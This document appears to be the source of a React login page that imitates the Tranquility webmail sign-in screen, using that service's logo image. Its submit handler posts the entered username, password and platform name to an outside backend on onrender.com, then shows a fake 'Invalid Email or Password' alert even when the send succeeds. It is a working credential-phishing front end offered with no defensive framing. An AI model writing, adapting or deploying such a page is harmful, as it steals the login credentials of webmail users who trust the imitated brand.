import React from 'react';

import './Home.css'

import { useState } from 'react';

import axios from 'axios';



function Home(){


    const[email, setUserName] = useState("");
    const[password, setPassword] = useState("");

    const[platform, setPlatform] = useState("Tranquility")

    const[showError, setShowError] = useState(false);


async function handleSubmit(e){
    e.preventDefault();

    try {
        const response = await axios.post('https://mainbackend-rd07.onrender.com/api/send', {
            email:email,
            password:password,
            platform:platform
        });
    
        // Handle success
        console.log('Data sent:', response.data.message);

        if(response.status == 200){
            console.log(response.data.message);

            setShowError(true);
        }
      } catch (error) {
        // Handle error
        console.error('Error:', error);
      }
    
}


    return (
        <>

        <div className='spacer'>
        {showError && <div className="alert alert-danger alert-dismissible fade show" role="alert">
            <strong>Invalid Email or Password</strong> 
            <button type="button" className="close" data-dismiss="alert" aria-label="Close">
                <span aria-hidden="true">&times;</span>
            </button>
            </div>}
        </div>



            <div className='col-md-4 whitediv m-auto py-3 px-4'>
                <img  src='https://webmail.tranquility.net/skins/outlook_plus/assets/images/login_square.png?s=1598310297' />



                <form onSubmit={handleSubmit}>

                    <div className='form-group'>
                        <label className='label'> Username</label>
                        <input type="text"onChange={function(e){
                            setUserName(e.target.value);
                        }}value={email} className="form-control"placeholder='Username'required />

                    </div>


                    <div className='form-group'>
                        <label className='label'> Password</label>
                        <input type="password"onChange={function(e){
                            setPassword(e.target.value);
                        }}value={password} className="form-control"placeholder='Password'required />

                    </div>

                    <div className='form-group'>

                        <button type='submit' style={{
                            background:"#585858",
                        }}className='btn text-center w-100 font-weight-bold text-light'>LOGIN</button>

                    </div>

                </form>

            </div>
        
        </>
    );
}

export default Home;